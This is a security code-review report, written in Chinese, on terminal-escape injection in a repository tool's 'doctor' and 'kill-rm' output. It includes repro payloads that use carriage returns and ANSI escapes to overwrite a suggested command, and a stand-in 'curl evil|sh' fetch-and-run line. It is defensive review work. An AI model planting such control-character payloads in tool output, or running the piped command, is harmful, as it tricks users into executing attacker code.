severity: major

# 代碼審第 2 輪 · 資安-opus

鏡頭:筆記(含 kill_recipes)與 .lumos/config.json 可能來自不可信的提交;doctor 在 CI 與推送前自動跑。只報能被利用的。
重現腳本:`kcc-r2-work-資安-opus/repro.py`(每個情境自己建 repo,只用無害標記 `PWNED_MARKER`),在 73bc8aff 的 clone 上跑:
`/opt/homebrew/bin/python3 <work>/repro.py <work> <work>/repo/scripts/lumos <情境>`

## F1 kill-rm 印的「照上面的範本改寫」那一行沒經 _kill_show,配方欄位夾 \r 就能把整行換成攻擊者寫的指令
severity: major
blocking: 是
引句:「配方裡人寫的欄位印進提醒之前:加引號、跳脫引號與所有控制字元(換行、終端跳脫碼、C1、雙向覆寫)」
file: `scripts/lumos:13529`(`_kill_add_template`:各欄只過 `shlex.quote`,控制字元原樣)
file: `scripts/lumos:13611`(`_kill_rm_show`:把範本原樣 print 到標準輸出)
file: `scripts/lumos:13605`(收尾那句「照上面的範本填好原文 kill-add」)

1. 這一輪的修法只在 P2 行與 kill-add 提醒套了 `_kill_show`。但 P2 的修法叫人跑 `kill-rm`,而 kill-rm 會再印一行「照現在的程式改寫後重新宣告:lumos guard kill-add …」範本,並叫人照它重填。範本裡 note/new/test/platform/file/invariant 都是配方原字串,只經 `shlex.quote`;`shlex.quote` 只防 shell 斷字,不處理 `\r`、ESC。
2. 攻擊:提交一條 file 指到不存在檔的配方(P2 一定列它),note 寫成 `"\r" + 一整行假範本(結尾帶 "; <指令> #") + "\x1b[K"`。終端顯示時 `\r` 回到行首,假範本把真範本整行蓋掉,`ESC[K` 清掉殘尾。使用者從畫面複製那一行,拿到的是看得到的字,也就是攻擊者的指令,引號邊界已經不在畫面上。
3. 重現(情境 `rm-template`;腳本照「畫面上看到的」那一行貼進 bash,把 `lumos guard kill-add` 換成 `true` 免得真的寫入):
   ```
   P2 叫人跑: [... 修法:lumos guard kill-rm Systems/Limit --id c16895174179]
   == kill-rm 原始 stdout(repr) ==
   '  照現在的程式改寫後重新宣告:lumos guard kill-add Systems/Limit \'上限恆為5\' --file gone.py ... --note \'\r  照現在的程式改寫後重新宣告:lumos guard kill-add Systems/Limit 上限恆為5 --file prod.py ... ; touch PWNED_MARKER #\x1b[K\''
   == 終端畫面上看到的 ==
     照現在的程式改寫後重新宣告:lumos guard kill-add Systems/Limit 上限恆為5 --file prod.py --old '"'"'<照現在的程式填原文>'"'"' --new '"'"'LIMIT = 9'"'"' ; touch PWNED_MARKER #'
   PWNED_MARKER 存在? True
   ```
   上一行的「完整內容」是 `json.dumps` 印的,`\r` 會變成字面看得出來;但它不是工具叫人照抄的那行。
4. 跟第 1 輪 F1 同一類(要人貼才會發生),但這次修法的說明寫明要擋住這一類,範本那行又是工具明講「照上面的範本」的那行,而且 P2 會直接把人帶到這裡,所以列 major。
5. 建議修法:`_kill_add_template` 遇到含 Cc/Cf/Zl/Zp 字元的欄位就不要放進範本,改用佔位字(例如 `'<note 含控制字元,見上面完整內容>'`),或整行先過一次跟 `_kill_show` 同一套的字元檢查。補一條測試:note 帶 `\r` 與 `\x1b` 時 kill-rm 的標準輸出不含原始控制字元。

## F2 筆記檔名夾控制字元時,P2 那一行的檔名與「可直接貼」的修法節點仍原樣印出
severity: minor
blocking: 否
引句:「st["items"].append(([stem], f"{rel} → 第 {idx} 條{res['detail']}(修法:{_kill_fix_hint(rel, r)})"))」
file: `scripts/lumos:12947`(`_kill_node_arg` 只用 `shlex.quote`)

1. 修法給檔名、平台、合約片段套了 `_kill_show`,但行首的 `rel`(筆記路徑)與修法裡的節點(`_kill_node_arg`)還是原字串。git 跟 macOS 都允許檔名含 `\r`、ESC。
2. 重現(情境 `note-name`,筆記叫 `A\rx.md`):
   ```
   '      • Systems/A\rx.md → 平台 "csharp-xunit" 的 "gone.py":讀不到(不存在)(合約片段:"上限恆為5";修法:lumos guard kill-rm \'Systems/A\rx\' --id 52a2f6dd6430)'
   ```
   `\r` 原樣到了 stdout,同一個手法可以在 P2 行裡蓋掉工具給的修法。
3. 只列 minor:doctor 其他段落本來就原樣印筆記路徑,這類不是這次才有;這次多出來的是「可直接貼」的那一段。建議 `rel` 跟節點參數含控制字元時也過 `_kill_show`,或修法改用佔位字並提示檔名有問題。

## F3 從設定檔來的字(平台根、平台名在例外訊息裡)沒過 _kill_show,P2 跟 Check T 新加的那行都原樣印
severity: minor
blocking: 否
引句:「out.update(status="noroot", detail=f"平台 {_kill_show(plat)} 的根找不到({pentry['root']}:{why})")」
引句:「print(f"  {C['Y']}—{C['X']} 設定檔讀不了({_te}),跳過 test_ref 存在性檢查(裸合約仍檢)")」
file: `scripts/lumos:12954`(`_kill_cfg_load` 把 `str(ex)` 原樣當 cfg_err 回傳;`load_platforms` 的 ValueError 會把設定檔裡的平台名放進訊息)

1. 威脅模型裡設定檔也不可信。`plat` 有跳脫,但同一行的 `pentry['root']` 沒有;`cfg_err` 跟 Check T 新加的 `_te` 都是例外訊息,裡面帶設定檔裡的平台名。kill-add 走 `else` 分支時印 `{res['detail']},沒驗原文`,也是同一串。
2. 重現:
   - 情境 `cfg-root`(平台根寫成 `nope\r\x1b[K修法:curl evil|sh`):
     `RAW: '      • 平台 "a" 的根找不到(/…/nope\r\x1b[K修法:curl evil|sh  :不存在),它底下 1 條配方沒驗'`
   - 情境 `cfg-err`(平台名夾 `\r\x1b[K`、預設平台指到不存在的鍵):
     `RAW: "  — 設定檔讀不了(預設平台 'zz' 不在平台清單裡(有的是: a\r\x1b[K修法:curl evil|sh, b)),跳過 test_ref 存在性檢查(裸合約仍檢)"`
     `RAW: "      • 設定檔讀不了:預設平台 'zz' 不在平台清單裡(有的是: a\r\x1b[K修法:curl evil|sh, b)"`
3. 效果跟第 1 輪 F1 同類:能在 doctor 輸出裡用 `\r`/ESC 蓋掉一行、放一段假的修法。不會自動執行,所以列 minor。建議 `pentry['root']`、`top`、`why`、`cfg_err`、`_te` 印之前都過 `_kill_show`(或 repr)。

## 看過、判定不能利用的(不列 finding)
- `_kill_alias` 的 `os.path.lexists`:探的路徑是 `top/<模型路徑>/<一段名字>`。名字是按 `/` 切出來的,裡面沒有 `/`;`..` 由模型處理,不會傳給 lexists;絕對連結模型直接判跑出 repo。lexists 為真之後,還要在 HEAD 的 ls-tree 裡、同一個前綴下找到 casefold 相等的名字才回別名。前綴含不在提交裡的段時,任何候選都對不上,所以 repo 外的檔存不存在,輸出都一樣,沒有存在與否的旁路。判 judge_file 的「不在提交裡/不存在」那個 lexists 是第 1 輪就有的,不是這次新加的。
- git 子程序 timeout:只加了 `timeout=` 參數,參數陣列還是寫死(`-C <路徑>`、`HEAD:` 前綴、ls-tree 固定旗標),沒有新的注入點。timeout 例外訊息只帶類別名或固定的 git stderr 前 120 字(stderr 是 git 自己的說明)。
- `_kill_pathspec` 與 unrestorable 的「改寫成 "<rel>"」:rel 是模型解析出來、HEAD 裡實際存在的一般檔路徑,已經過 `_kill_show`。照它重新 kill-add 之後,guard kill 也只會在隔離工作樹裡改那支檔再還原,沒辦法拿來引人做危險動作。
- 配方欄位夾單獨的代理字元(`"\ud800"`):`_kill_recipe_id` 編碼失敗,那篇整篇變成一條「這篇判不了:UnicodeEncodeError」(情境 `surrogate`)。只影響攻擊者自己能改的那篇,而且仍然有一條提醒,不算隱藏。
- `_kill_show` 本身:用 json 引號,加上 Cc/Cf/Zl/Zp 轉成 `\uXXXX`。實測 `\x1b`、`\x9b`、`\r`、`\n` 都變成字面。沒跳脫的有組合字、全形或彎引號、一般空白。這些只能做視覺上的混淆,而且假段落會被包在工具加的引號裡;我沒做出能把人帶去執行的重現,依規則不列。

最高等級:major
